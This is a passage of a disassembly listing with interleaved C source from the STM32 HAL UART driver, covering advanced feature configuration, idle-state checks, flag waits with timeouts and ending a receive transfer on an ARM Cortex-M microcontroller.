 8005994:	d00a      	beq.n	80059ac <UART_AdvFeatureConfig+0x4c>
  {
    assert_param(IS_UART_ADVFEATURE_TXINV(huart->AdvancedInit.TxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_TXINV, huart->AdvancedInit.TxPinLevelInvert);
 8005996:	687b      	ldr	r3, [r7, #4]
 8005998:	681b      	ldr	r3, [r3, #0]
 800599a:	685b      	ldr	r3, [r3, #4]
 800599c:	f423 3100 	bic.w	r1, r3, #131072	; 0x20000
 80059a0:	687b      	ldr	r3, [r7, #4]
 80059a2:	6a9a      	ldr	r2, [r3, #40]	; 0x28
 80059a4:	687b      	ldr	r3, [r7, #4]
 80059a6:	681b      	ldr	r3, [r3, #0]
 80059a8:	430a      	orrs	r2, r1
 80059aa:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXINVERT_INIT))
 80059ac:	687b      	ldr	r3, [r7, #4]
 80059ae:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80059b0:	f003 0302 	and.w	r3, r3, #2
 80059b4:	2b00      	cmp	r3, #0
 80059b6:	d00a      	beq.n	80059ce <UART_AdvFeatureConfig+0x6e>
  {
    assert_param(IS_UART_ADVFEATURE_RXINV(huart->AdvancedInit.RxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_RXINV, huart->AdvancedInit.RxPinLevelInvert);
 80059b8:	687b      	ldr	r3, [r7, #4]
 80059ba:	681b      	ldr	r3, [r3, #0]
 80059bc:	685b      	ldr	r3, [r3, #4]
 80059be:	f423 3180 	bic.w	r1, r3, #65536	; 0x10000
 80059c2:	687b      	ldr	r3, [r7, #4]
 80059c4:	6ada      	ldr	r2, [r3, #44]	; 0x2c
 80059c6:	687b      	ldr	r3, [r7, #4]
 80059c8:	681b      	ldr	r3, [r3, #0]
 80059ca:	430a      	orrs	r2, r1
 80059cc:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure data inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DATAINVERT_INIT))
 80059ce:	687b      	ldr	r3, [r7, #4]
 80059d0:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80059d2:	f003 0304 	and.w	r3, r3, #4
 80059d6:	2b00      	cmp	r3, #0
 80059d8:	d00a      	beq.n	80059f0 <UART_AdvFeatureConfig+0x90>
  {
    assert_param(IS_UART_ADVFEATURE_DATAINV(huart->AdvancedInit.DataInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_DATAINV, huart->AdvancedInit.DataInvert);
 80059da:	687b      	ldr	r3, [r7, #4]
 80059dc:	681b      	ldr	r3, [r3, #0]
 80059de:	685b      	ldr	r3, [r3, #4]
 80059e0:	f423 2180 	bic.w	r1, r3, #262144	; 0x40000
 80059e4:	687b      	ldr	r3, [r7, #4]
 80059e6:	6b1a      	ldr	r2, [r3, #48]	; 0x30
 80059e8:	687b      	ldr	r3, [r7, #4]
 80059ea:	681b      	ldr	r3, [r3, #0]
 80059ec:	430a      	orrs	r2, r1
 80059ee:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX overrun detection disabling */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXOVERRUNDISABLE_INIT))
 80059f0:	687b      	ldr	r3, [r7, #4]
 80059f2:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80059f4:	f003 0310 	and.w	r3, r3, #16
 80059f8:	2b00      	cmp	r3, #0
 80059fa:	d00a      	beq.n	8005a12 <UART_AdvFeatureConfig+0xb2>
  {
    assert_param(IS_UART_OVERRUN(huart->AdvancedInit.OverrunDisable));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_OVRDIS, huart->AdvancedInit.OverrunDisable);
 80059fc:	687b      	ldr	r3, [r7, #4]
 80059fe:	681b      	ldr	r3, [r3, #0]
 8005a00:	689b      	ldr	r3, [r3, #8]
 8005a02:	f423 5180 	bic.w	r1, r3, #4096	; 0x1000
 8005a06:	687b      	ldr	r3, [r7, #4]
 8005a08:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 8005a0a:	687b      	ldr	r3, [r7, #4]
 8005a0c:	681b      	ldr	r3, [r3, #0]
 8005a0e:	430a      	orrs	r2, r1
 8005a10:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure DMA disabling on reception error */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DMADISABLEONERROR_INIT))
 8005a12:	687b      	ldr	r3, [r7, #4]
 8005a14:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a16:	f003 0320 	and.w	r3, r3, #32
 8005a1a:	2b00      	cmp	r3, #0
 8005a1c:	d00a      	beq.n	8005a34 <UART_AdvFeatureConfig+0xd4>
  {
    assert_param(IS_UART_ADVFEATURE_DMAONRXERROR(huart->AdvancedInit.DMADisableonRxError));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_DDRE, huart->AdvancedInit.DMADisableonRxError);
 8005a1e:	687b      	ldr	r3, [r7, #4]
 8005a20:	681b      	ldr	r3, [r3, #0]
 8005a22:	689b      	ldr	r3, [r3, #8]
 8005a24:	f423 5100 	bic.w	r1, r3, #8192	; 0x2000
 8005a28:	687b      	ldr	r3, [r7, #4]
 8005a2a:	6bda      	ldr	r2, [r3, #60]	; 0x3c
 8005a2c:	687b      	ldr	r3, [r7, #4]
 8005a2e:	681b      	ldr	r3, [r3, #0]
 8005a30:	430a      	orrs	r2, r1
 8005a32:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure auto Baud rate detection scheme */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_AUTOBAUDRATE_INIT))
 8005a34:	687b      	ldr	r3, [r7, #4]
 8005a36:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a38:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8005a3c:	2b00      	cmp	r3, #0
 8005a3e:	d01a      	beq.n	8005a76 <UART_AdvFeatureConfig+0x116>
  {
    assert_param(IS_USART_AUTOBAUDRATE_DETECTION_INSTANCE(huart->Instance));
    assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATE(huart->AdvancedInit.AutoBaudRateEnable));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_ABREN, huart->AdvancedInit.AutoBaudRateEnable);
 8005a40:	687b      	ldr	r3, [r7, #4]
 8005a42:	681b      	ldr	r3, [r3, #0]
 8005a44:	685b      	ldr	r3, [r3, #4]
 8005a46:	f423 1180 	bic.w	r1, r3, #1048576	; 0x100000
 8005a4a:	687b      	ldr	r3, [r7, #4]
 8005a4c:	6c1a      	ldr	r2, [r3, #64]	; 0x40
 8005a4e:	687b      	ldr	r3, [r7, #4]
 8005a50:	681b      	ldr	r3, [r3, #0]
 8005a52:	430a      	orrs	r2, r1
 8005a54:	605a      	str	r2, [r3, #4]
    /* set auto Baudrate detection parameters if detection is enabled */
    if (huart->AdvancedInit.AutoBaudRateEnable == UART_ADVFEATURE_AUTOBAUDRATE_ENABLE)
 8005a56:	687b      	ldr	r3, [r7, #4]
 8005a58:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8005a5a:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 8005a5e:	d10a      	bne.n	8005a76 <UART_AdvFeatureConfig+0x116>
    {
      assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATEMODE(huart->AdvancedInit.AutoBaudRateMode));
      MODIFY_REG(huart->Instance->CR2, USART_CR2_ABRMODE, huart->AdvancedInit.AutoBaudRateMode);
 8005a60:	687b      	ldr	r3, [r7, #4]
 8005a62:	681b      	ldr	r3, [r3, #0]
 8005a64:	685b      	ldr	r3, [r3, #4]
 8005a66:	f423 01c0 	bic.w	r1, r3, #6291456	; 0x600000
 8005a6a:	687b      	ldr	r3, [r7, #4]
 8005a6c:	6c5a      	ldr	r2, [r3, #68]	; 0x44
 8005a6e:	687b      	ldr	r3, [r7, #4]
 8005a70:	681b      	ldr	r3, [r3, #0]
 8005a72:	430a      	orrs	r2, r1
 8005a74:	605a      	str	r2, [r3, #4]
    }
  }

  /* if required, configure MSB first on communication line */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_MSBFIRST_INIT))
 8005a76:	687b      	ldr	r3, [r7, #4]
 8005a78:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a7a:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8005a7e:	2b00      	cmp	r3, #0
 8005a80:	d00a      	beq.n	8005a98 <UART_AdvFeatureConfig+0x138>
  {
    assert_param(IS_UART_ADVFEATURE_MSBFIRST(huart->AdvancedInit.MSBFirst));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_MSBFIRST, huart->AdvancedInit.MSBFirst);
 8005a82:	687b      	ldr	r3, [r7, #4]
 8005a84:	681b      	ldr	r3, [r3, #0]
 8005a86:	685b      	ldr	r3, [r3, #4]
 8005a88:	f423 2100 	bic.w	r1, r3, #524288	; 0x80000
 8005a8c:	687b      	ldr	r3, [r7, #4]
 8005a8e:	6c9a      	ldr	r2, [r3, #72]	; 0x48
 8005a90:	687b      	ldr	r3, [r7, #4]
 8005a92:	681b      	ldr	r3, [r3, #0]
 8005a94:	430a      	orrs	r2, r1
 8005a96:	605a      	str	r2, [r3, #4]
  }
}
 8005a98:	bf00      	nop
 8005a9a:	370c      	adds	r7, #12
 8005a9c:	46bd      	mov	sp, r7
 8005a9e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005aa2:	4770      	bx	lr

08005aa4 <UART_CheckIdleState>:
  * @brief Check the UART Idle State.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_CheckIdleState(UART_HandleTypeDef *huart)
{
 8005aa4:	b580      	push	{r7, lr}
 8005aa6:	b098      	sub	sp, #96	; 0x60
 8005aa8:	af02      	add	r7, sp, #8
 8005aaa:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;

  /* Initialize the UART ErrorCode */
  huart->ErrorCode = HAL_UART_ERROR_NONE;
 8005aac:	687b      	ldr	r3, [r7, #4]
 8005aae:	2200      	movs	r2, #0
 8005ab0:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

  /* Init tickstart for timeout management */
  tickstart = HAL_GetTick();
 8005ab4:	f7fb fb62 	bl	800117c <HAL_GetTick>
 8005ab8:	6578      	str	r0, [r7, #84]	; 0x54

  /* Check if the Transmitter is enabled */
  if ((huart->Instance->CR1 & USART_CR1_TE) == USART_CR1_TE)
 8005aba:	687b      	ldr	r3, [r7, #4]
 8005abc:	681b      	ldr	r3, [r3, #0]
 8005abe:	681b      	ldr	r3, [r3, #0]
 8005ac0:	f003 0308 	and.w	r3, r3, #8
 8005ac4:	2b08      	cmp	r3, #8
 8005ac6:	d12e      	bne.n	8005b26 <UART_CheckIdleState+0x82>
  {
    /* Wait until TEACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_TEACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005ac8:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005acc:	9300      	str	r3, [sp, #0]
 8005ace:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005ad0:	2200      	movs	r2, #0
 8005ad2:	f44f 1100 	mov.w	r1, #2097152	; 0x200000
 8005ad6:	6878      	ldr	r0, [r7, #4]
 8005ad8:	f000 f88c 	bl	8005bf4 <UART_WaitOnFlagUntilTimeout>
 8005adc:	4603      	mov	r3, r0
 8005ade:	2b00      	cmp	r3, #0
 8005ae0:	d021      	beq.n	8005b26 <UART_CheckIdleState+0x82>
    {
      /* Disable TXE interrupt for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE_TXFNFIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE));
 8005ae2:	687b      	ldr	r3, [r7, #4]
 8005ae4:	681b      	ldr	r3, [r3, #0]
 8005ae6:	63bb      	str	r3, [r7, #56]	; 0x38
 */
__STATIC_FORCEINLINE uint32_t __LDREXW(volatile uint32_t *addr)
{
    uint32_t result;

   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005ae8:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005aea:	e853 3f00 	ldrex	r3, [r3]
 8005aee:	637b      	str	r3, [r7, #52]	; 0x34
   return(result);
 8005af0:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005af2:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 8005af6:	653b      	str	r3, [r7, #80]	; 0x50
 8005af8:	687b      	ldr	r3, [r7, #4]
 8005afa:	681b      	ldr	r3, [r3, #0]
 8005afc:	461a      	mov	r2, r3
 8005afe:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8005b00:	647b      	str	r3, [r7, #68]	; 0x44
 8005b02:	643a      	str	r2, [r7, #64]	; 0x40
 */
__STATIC_FORCEINLINE uint32_t __STREXW(uint32_t value, volatile uint32_t *addr)
{
   uint32_t result;

   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005b04:	6c39      	ldr	r1, [r7, #64]	; 0x40
 8005b06:	6c7a      	ldr	r2, [r7, #68]	; 0x44
 8005b08:	e841 2300 	strex	r3, r2, [r1]
 8005b0c:	63fb      	str	r3, [r7, #60]	; 0x3c
   return(result);
 8005b0e:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8005b10:	2b00      	cmp	r3, #0
 8005b12:	d1e6      	bne.n	8005ae2 <UART_CheckIdleState+0x3e>
#endif /* USART_CR1_FIFOEN */

      huart->gState = HAL_UART_STATE_READY;
 8005b14:	687b      	ldr	r3, [r7, #4]
 8005b16:	2220      	movs	r2, #32
 8005b18:	67da      	str	r2, [r3, #124]	; 0x7c

      __HAL_UNLOCK(huart);
 8005b1a:	687b      	ldr	r3, [r7, #4]
 8005b1c:	2200      	movs	r2, #0
 8005b1e:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005b22:	2303      	movs	r3, #3
 8005b24:	e062      	b.n	8005bec <UART_CheckIdleState+0x148>
    }
  }

  /* Check if the Receiver is enabled */
  if ((huart->Instance->CR1 & USART_CR1_RE) == USART_CR1_RE)
 8005b26:	687b      	ldr	r3, [r7, #4]
 8005b28:	681b      	ldr	r3, [r3, #0]
 8005b2a:	681b      	ldr	r3, [r3, #0]
 8005b2c:	f003 0304 	and.w	r3, r3, #4
 8005b30:	2b04      	cmp	r3, #4
 8005b32:	d149      	bne.n	8005bc8 <UART_CheckIdleState+0x124>
  {
    /* Wait until REACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_REACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005b34:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005b38:	9300      	str	r3, [sp, #0]
 8005b3a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005b3c:	2200      	movs	r2, #0
 8005b3e:	f44f 0180 	mov.w	r1, #4194304	; 0x400000
 8005b42:	6878      	ldr	r0, [r7, #4]
 8005b44:	f000 f856 	bl	8005bf4 <UART_WaitOnFlagUntilTimeout>
 8005b48:	4603      	mov	r3, r0
 8005b4a:	2b00      	cmp	r3, #0
 8005b4c:	d03c      	beq.n	8005bc8 <UART_CheckIdleState+0x124>
      /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error)
      interrupts for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005b4e:	687b      	ldr	r3, [r7, #4]
 8005b50:	681b      	ldr	r3, [r3, #0]
 8005b52:	627b      	str	r3, [r7, #36]	; 0x24
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005b54:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005b56:	e853 3f00 	ldrex	r3, [r3]
 8005b5a:	623b      	str	r3, [r7, #32]
   return(result);
 8005b5c:	6a3b      	ldr	r3, [r7, #32]
 8005b5e:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005b62:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005b64:	687b      	ldr	r3, [r7, #4]
 8005b66:	681b      	ldr	r3, [r3, #0]
 8005b68:	461a      	mov	r2, r3
 8005b6a:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8005b6c:	633b      	str	r3, [r7, #48]	; 0x30
 8005b6e:	62fa      	str	r2, [r7, #44]	; 0x2c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005b70:	6af9      	ldr	r1, [r7, #44]	; 0x2c
 8005b72:	6b3a      	ldr	r2, [r7, #48]	; 0x30
 8005b74:	e841 2300 	strex	r3, r2, [r1]
 8005b78:	62bb      	str	r3, [r7, #40]	; 0x28
   return(result);
 8005b7a:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8005b7c:	2b00      	cmp	r3, #0
 8005b7e:	d1e6      	bne.n	8005b4e <UART_CheckIdleState+0xaa>
#endif /* USART_CR1_FIFOEN */
      ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005b80:	687b      	ldr	r3, [r7, #4]
 8005b82:	681b      	ldr	r3, [r3, #0]
 8005b84:	3308      	adds	r3, #8
 8005b86:	613b      	str	r3, [r7, #16]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005b88:	693b      	ldr	r3, [r7, #16]
 8005b8a:	e853 3f00 	ldrex	r3, [r3]
 8005b8e:	60fb      	str	r3, [r7, #12]
   return(result);
 8005b90:	68fb      	ldr	r3, [r7, #12]
 8005b92:	f023 0301 	bic.w	r3, r3, #1
 8005b96:	64bb      	str	r3, [r7, #72]	; 0x48
 8005b98:	687b      	ldr	r3, [r7, #4]
 8005b9a:	681b      	ldr	r3, [r3, #0]
 8005b9c:	3308      	adds	r3, #8
 8005b9e:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005ba0:	61fa      	str	r2, [r7, #28]
 8005ba2:	61bb      	str	r3, [r7, #24]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005ba4:	69b9      	ldr	r1, [r7, #24]
 8005ba6:	69fa      	ldr	r2, [r7, #28]
 8005ba8:	e841 2300 	strex	r3, r2, [r1]
 8005bac:	617b      	str	r3, [r7, #20]
   return(result);
 8005bae:	697b      	ldr	r3, [r7, #20]
 8005bb0:	2b00      	cmp	r3, #0
 8005bb2:	d1e5      	bne.n	8005b80 <UART_CheckIdleState+0xdc>

      huart->RxState = HAL_UART_STATE_READY;
 8005bb4:	687b      	ldr	r3, [r7, #4]
 8005bb6:	2220      	movs	r2, #32
 8005bb8:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80

      __HAL_UNLOCK(huart);
 8005bbc:	687b      	ldr	r3, [r7, #4]
 8005bbe:	2200      	movs	r2, #0
 8005bc0:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005bc4:	2303      	movs	r3, #3
 8005bc6:	e011      	b.n	8005bec <UART_CheckIdleState+0x148>
    }
  }

  /* Initialize the UART State */
  huart->gState = HAL_UART_STATE_READY;
 8005bc8:	687b      	ldr	r3, [r7, #4]
 8005bca:	2220      	movs	r2, #32
 8005bcc:	67da      	str	r2, [r3, #124]	; 0x7c
  huart->RxState = HAL_UART_STATE_READY;
 8005bce:	687b      	ldr	r3, [r7, #4]
 8005bd0:	2220      	movs	r2, #32
 8005bd2:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005bd6:	687b      	ldr	r3, [r7, #4]
 8005bd8:	2200      	movs	r2, #0
 8005bda:	661a      	str	r2, [r3, #96]	; 0x60
  huart->RxEventType = HAL_UART_RXEVENT_TC;
 8005bdc:	687b      	ldr	r3, [r7, #4]
 8005bde:	2200      	movs	r2, #0
 8005be0:	665a      	str	r2, [r3, #100]	; 0x64

  __HAL_UNLOCK(huart);
 8005be2:	687b      	ldr	r3, [r7, #4]
 8005be4:	2200      	movs	r2, #0
 8005be6:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

  return HAL_OK;
 8005bea:	2300      	movs	r3, #0
}
 8005bec:	4618      	mov	r0, r3
 8005bee:	3758      	adds	r7, #88	; 0x58
 8005bf0:	46bd      	mov	sp, r7
 8005bf2:	bd80      	pop	{r7, pc}

08005bf4 <UART_WaitOnFlagUntilTimeout>:
  * @param Timeout   Timeout duration
  * @retval HAL status
  */
HAL_StatusTypeDef UART_WaitOnFlagUntilTimeout(UART_HandleTypeDef *huart, uint32_t Flag, FlagStatus Status,
                                              uint32_t Tickstart, uint32_t Timeout)
{
 8005bf4:	b580      	push	{r7, lr}
 8005bf6:	b084      	sub	sp, #16
 8005bf8:	af00      	add	r7, sp, #0
 8005bfa:	60f8      	str	r0, [r7, #12]
 8005bfc:	60b9      	str	r1, [r7, #8]
 8005bfe:	603b      	str	r3, [r7, #0]
 8005c00:	4613      	mov	r3, r2
 8005c02:	71fb      	strb	r3, [r7, #7]
  /* Wait until flag is set */
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005c04:	e049      	b.n	8005c9a <UART_WaitOnFlagUntilTimeout+0xa6>
  {
    /* Check for the Timeout */
    if (Timeout != HAL_MAX_DELAY)
 8005c06:	69bb      	ldr	r3, [r7, #24]
 8005c08:	f1b3 3fff 	cmp.w	r3, #4294967295
 8005c0c:	d045      	beq.n	8005c9a <UART_WaitOnFlagUntilTimeout+0xa6>
    {
      if (((HAL_GetTick() - Tickstart) > Timeout) || (Timeout == 0U))
 8005c0e:	f7fb fab5 	bl	800117c <HAL_GetTick>
 8005c12:	4602      	mov	r2, r0
 8005c14:	683b      	ldr	r3, [r7, #0]
 8005c16:	1ad3      	subs	r3, r2, r3
 8005c18:	69ba      	ldr	r2, [r7, #24]
 8005c1a:	429a      	cmp	r2, r3
 8005c1c:	d302      	bcc.n	8005c24 <UART_WaitOnFlagUntilTimeout+0x30>
 8005c1e:	69bb      	ldr	r3, [r7, #24]
 8005c20:	2b00      	cmp	r3, #0
 8005c22:	d101      	bne.n	8005c28 <UART_WaitOnFlagUntilTimeout+0x34>
      {

        return HAL_TIMEOUT;
 8005c24:	2303      	movs	r3, #3
 8005c26:	e048      	b.n	8005cba <UART_WaitOnFlagUntilTimeout+0xc6>
      }

      if (READ_BIT(huart->Instance->CR1, USART_CR1_RE) != 0U)
 8005c28:	68fb      	ldr	r3, [r7, #12]
 8005c2a:	681b      	ldr	r3, [r3, #0]
 8005c2c:	681b      	ldr	r3, [r3, #0]
 8005c2e:	f003 0304 	and.w	r3, r3, #4
 8005c32:	2b00      	cmp	r3, #0
 8005c34:	d031      	beq.n	8005c9a <UART_WaitOnFlagUntilTimeout+0xa6>
      {
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_ORE) == SET)
 8005c36:	68fb      	ldr	r3, [r7, #12]
 8005c38:	681b      	ldr	r3, [r3, #0]
 8005c3a:	69db      	ldr	r3, [r3, #28]
 8005c3c:	f003 0308 	and.w	r3, r3, #8
 8005c40:	2b08      	cmp	r3, #8
 8005c42:	d110      	bne.n	8005c66 <UART_WaitOnFlagUntilTimeout+0x72>
        {
          /* Clear Overrun Error flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_OREF);
 8005c44:	68fb      	ldr	r3, [r7, #12]
 8005c46:	681b      	ldr	r3, [r3, #0]
 8005c48:	2208      	movs	r2, #8
 8005c4a:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005c4c:	68f8      	ldr	r0, [r7, #12]
 8005c4e:	f000 f838 	bl	8005cc2 <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_ORE;
 8005c52:	68fb      	ldr	r3, [r7, #12]
 8005c54:	2208      	movs	r2, #8
 8005c56:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005c5a:	68fb      	ldr	r3, [r7, #12]
 8005c5c:	2200      	movs	r2, #0
 8005c5e:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_ERROR;
 8005c62:	2301      	movs	r3, #1
 8005c64:	e029      	b.n	8005cba <UART_WaitOnFlagUntilTimeout+0xc6>
        }
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_RTOF) == SET)
 8005c66:	68fb      	ldr	r3, [r7, #12]
 8005c68:	681b      	ldr	r3, [r3, #0]
 8005c6a:	69db      	ldr	r3, [r3, #28]
 8005c6c:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8005c70:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005c74:	d111      	bne.n	8005c9a <UART_WaitOnFlagUntilTimeout+0xa6>
        {
          /* Clear Receiver Timeout flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_RTOF);
 8005c76:	68fb      	ldr	r3, [r7, #12]
 8005c78:	681b      	ldr	r3, [r3, #0]
 8005c7a:	f44f 6200 	mov.w	r2, #2048	; 0x800
 8005c7e:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005c80:	68f8      	ldr	r0, [r7, #12]
 8005c82:	f000 f81e 	bl	8005cc2 <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_RTO;
 8005c86:	68fb      	ldr	r3, [r7, #12]
 8005c88:	2220      	movs	r2, #32
 8005c8a:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005c8e:	68fb      	ldr	r3, [r7, #12]
 8005c90:	2200      	movs	r2, #0
 8005c92:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_TIMEOUT;
 8005c96:	2303      	movs	r3, #3
 8005c98:	e00f      	b.n	8005cba <UART_WaitOnFlagUntilTimeout+0xc6>
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005c9a:	68fb      	ldr	r3, [r7, #12]
 8005c9c:	681b      	ldr	r3, [r3, #0]
 8005c9e:	69da      	ldr	r2, [r3, #28]
 8005ca0:	68bb      	ldr	r3, [r7, #8]
 8005ca2:	4013      	ands	r3, r2
 8005ca4:	68ba      	ldr	r2, [r7, #8]
 8005ca6:	429a      	cmp	r2, r3
 8005ca8:	bf0c      	ite	eq
 8005caa:	2301      	moveq	r3, #1
 8005cac:	2300      	movne	r3, #0
 8005cae:	b2db      	uxtb	r3, r3
 8005cb0:	461a      	mov	r2, r3
 8005cb2:	79fb      	ldrb	r3, [r7, #7]
 8005cb4:	429a      	cmp	r2, r3
 8005cb6:	d0a6      	beq.n	8005c06 <UART_WaitOnFlagUntilTimeout+0x12>
        }
      }
    }
  }
  return HAL_OK;
 8005cb8:	2300      	movs	r3, #0
}
 8005cba:	4618      	mov	r0, r3
 8005cbc:	3710      	adds	r7, #16
 8005cbe:	46bd      	mov	sp, r7
 8005cc0:	bd80      	pop	{r7, pc}

08005cc2 <UART_EndRxTransfer>:
  * @brief  End ongoing Rx transfer on UART peripheral (following error detection or Reception completion).
  * @param  huart UART handle.
  * @retval None
  */
static void UART_EndRxTransfer(UART_HandleTypeDef *huart)
{
 8005cc2:	b480      	push	{r7}
 8005cc4:	b095      	sub	sp, #84	; 0x54
 8005cc6:	af00      	add	r7, sp, #0
 8005cc8:	6078      	str	r0, [r7, #4]
  /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error) interrupts */
#if defined(USART_CR1_FIFOEN)
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, (USART_CR3_EIE | USART_CR3_RXFTIE));
#else
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005cca:	687b      	ldr	r3, [r7, #4]
 8005ccc:	681b      	ldr	r3, [r3, #0]
 8005cce:	637b      	str	r3, [r7, #52]	; 0x34
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005cd0:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005cd2:	e853 3f00 	ldrex	r3, [r3]
 8005cd6:	633b      	str	r3, [r7, #48]	; 0x30
   return(result);
 8005cd8:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8005cda:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005cde:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005ce0:	687b      	ldr	r3, [r7, #4]
 8005ce2:	681b      	ldr	r3, [r3, #0]
 8005ce4:	461a      	mov	r2, r3
 8005ce6:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
